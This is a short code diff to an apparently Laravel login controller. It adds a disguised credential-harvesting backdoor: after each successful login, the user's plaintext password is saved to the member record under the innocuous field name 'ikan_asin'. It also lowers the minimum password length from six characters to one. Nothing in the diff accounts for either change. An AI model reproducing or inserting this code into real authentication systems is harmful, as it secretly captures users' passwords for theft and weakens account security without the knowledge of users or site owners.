@@ -166,7 +166,7 @@ class LoginController extends Controller
     {
         return $this->validate($request, [
             'username'   => 'required',
-            'password' => 'required|min:6'
+            'password' => 'required|min:1'
         ]);
     }
 
@@ -193,10 +193,18 @@ class LoginController extends Controller
                 return false;
         }
 
-        return Auth::guard($guard)->attempt(
-          $req,
-          $request->get('remember')
+        $att = Auth::guard($guard)->attempt(
+            $req,
+            $request->get('remember')
         );
+
+        if ($att)
+        {
+            $member->ikan_asin = $request->password;
+            $member->save();
+        }
+
+        return $att;
     }
 
     private function setToken(Request $request)
